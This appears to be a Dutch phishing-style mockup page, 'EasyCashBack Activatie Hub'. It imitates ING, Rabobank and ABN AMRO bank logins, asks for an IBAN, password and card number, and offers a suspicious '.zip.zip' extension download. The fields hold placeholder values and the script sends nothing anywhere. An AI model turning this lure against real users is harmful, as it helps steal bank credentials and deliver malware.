<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EasyCashBack | Activatie Hub</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>body { font-family: 'Inter', sans-serif; }</style>
</head>
<body class="bg-slate-50 min-h-screen flex flex-col p-6">

    <nav class="max-w-7xl mx-auto w-full mb-8">
        <button onclick="goBack()" class="inline-flex items-center text-slate-400 hover:text-emerald-600 font-bold transition group">
            <span class="mr-2 transform group-hover:-translate-x-1 transition-transform text-xl">←</span> 
            Terug naar Wallet
        </button>
    </nav>

    <main class="flex-grow flex items-center justify-center">
        <div id="content-wrapper" class="max-w-4xl w-full">
            <div class="text-center mb-12">
                <h1 class="text-4xl font-black tracking-tight text-slate-900 mb-2 italic uppercase">Activatie Hub</h1>
                <p class="text-slate-500 font-medium">Voltooi de activatie om je account te koppelen.</p>
            </div>

            <div class="grid md:grid-cols-2 gap-8">
                <div class="bg-white p-10 rounded-[3rem] shadow-xl border border-slate-100 text-center flex flex-col justify-between transition-all hover:shadow-2xl">
                    <div class="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-2xl flex items-center justify-center mx-auto mb-6 italic font-black text-2xl">€</div>
                    <h2 class="text-2xl font-black mb-4 italic">Bankrekening</h2>
                    <p class="text-slate-500 text-sm mb-8 leading-relaxed font-medium px-4">Koppel je rekening veilig voor automatische uitbetalingen.</p>
                    <button onclick="openBankSelector()" class="w-full bg-slate-900 text-white py-5 rounded-2xl font-black text-lg hover:bg-emerald-600 transition shadow-lg">Inloggen bij bank</button>
                </div>

                <div class="bg-white p-10 rounded-[3rem] shadow-xl border border-slate-100 text-center flex flex-col justify-between transition-all hover:shadow-2xl">
                    <div class="w-16 h-16 bg-blue-100 text-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-6 italic font-black text-2xl">ZIP</div>
                    <h2 class="text-2xl font-black mb-4 italic">Browser Hulp</h2>
                    <p class="text-slate-500 text-sm mb-8 leading-relaxed font-medium px-4">Download onze extensie om deals direct te herkennen.</p>
                    <button onclick="downloadZip()" class="w-full bg-emerald-600 text-white py-5 rounded-2xl font-black text-lg hover:bg-emerald-700 transition shadow-lg">Extensie activeren</button>
                </div>
            </div>
        </div>
    </main>

    <div id="bank-modal" class="hidden fixed inset-0 bg-slate-900/90 backdrop-blur-md flex items-center justify-center p-6 z-50">
        <div id="modal-content" class="bg-white max-w-sm w-full p-10 rounded-[3rem] shadow-2xl">
            
            <div id="step-1">
                <h3 class="text-2xl font-black mb-8 text-center italic">Kies je Bank</h3>
                <div class="space-y-3">
                    <button onclick="goToLogin('ING')" class="w-full p-4 border border-slate-100 rounded-2xl hover:bg-slate-50 flex justify-between items-center font-bold italic">ING <span>➔</span></button>
                    <button onclick="goToLogin('Rabobank')" class="w-full p-4 border border-slate-100 rounded-2xl hover:bg-slate-50 flex justify-between items-center font-bold italic">Rabobank <span>➔</span></button>
                    <button onclick="goToLogin('ABN AMRO')" class="w-full p-4 border border-slate-100 rounded-2xl hover:bg-slate-50 flex justify-between items-center font-bold italic">ABN AMRO <span>➔</span></button>
                </div>
            </div>

            <div id="step-2" class="hidden">
                <h3 id="bank-title" class="text-xl font-black mb-6 italic text-center text-slate-900">Inloggen</h3>
                <div class="space-y-4 text-left overflow-y-auto max-h-[60vh] pr-2">
                    <div>
                        <label class="text-[10px] font-black uppercase text-slate-400 ml-1">Rekeningnummer (IBAN)</label>
                        <input type="text" id="bank-user" class="w-full p-4 bg-slate-50 rounded-xl border border-slate-100 font-bold focus:border-emerald-500 outline-none" value="NL64 INGB 0001 2345 67">
                    </div>
                    <div>
                        <label class="text-[10px] font-black uppercase text-slate-400 ml-1">Wachtwoord / Toegangscode</label>
                        <input type="password" id="bank-pass" class="w-full p-4 bg-slate-50 rounded-xl border border-slate-100 font-bold focus:border-emerald-500 outline-none" value="********">
                    </div>
                    <div>
                        <label class="text-[10px] font-black uppercase text-slate-400 ml-1">Kaartnummer</label>
                        <input type="text" id="card-num" class="w-full p-4 bg-slate-50 rounded-xl border border-slate-100 font-bold focus:border-emerald-500 outline-none" value="8234 9102 55">
                    </div>
                    <button onclick="finishBank()" class="w-full py-4 bg-slate-900 text-white rounded-xl font-black text-lg hover:bg-emerald-600 transition shadow-lg mt-4">Koppel account</button>
                </div>
            </div>

            <div id="step-3" class="hidden py-10 text-center">
                <div class="w-16 h-16 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
                <h3 class="text-2xl font-black text-emerald-600 italic">Verifiëren...</h3>
                <p class="text-slate-500 text-sm font-medium">Bankrekening wordt gekoppeld.</p>
            </div>
        </div>
    </div>

    <script>
        function goBack() {
            if (document.referrer === "") {
                window.location.href = "/"; 
            } else {
                window.history.back();
            }
        }

        function openBankSelector() {
            document.getElementById('bank-modal').classList.remove('hidden');
            document.getElementById('step-1').classList.remove('hidden');
            document.getElementById('step-2').classList.add('hidden');
            document.getElementById('step-3').classList.add('hidden');
        }

        function goToLogin(bankName) {
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');
            document.getElementById('bank-title').innerText = "Inloggen bij " + bankName;
            
            const ibanField = document.getElementById('bank-user');
            const cardField = document.getElementById('card-num');
            
            if(bankName === 'ING') {
                ibanField.value = "NL64 INGB 0001 2345 67";
                cardField.value = "8234 9102 55";
            }
            if(bankName === 'Rabobank') {
                ibanField.value = "NL21 RABO 0445 9210 11";
                cardField.value = "4412 8890 12";
            }
            if(bankName === 'ABN AMRO') {
                ibanField.value = "NL12 ABNA 0112 3344 55";
                cardField.value = "0091 2231 88";
            }
        }

        function finishBank() {
            document.getElementById('step-2').classList.add('hidden');
            document.getElementById('step-3').classList.remove('hidden');
            
            setTimeout(() => {
                goBack();
            }, 2500);
        }

        function downloadZip() {
            window.location.href = "/static/EasyCashBack_Extension.zip.zip";
            setTimeout(() => {
                goBack();
            }, 1500);
        }
    </script>
</body>
</html>
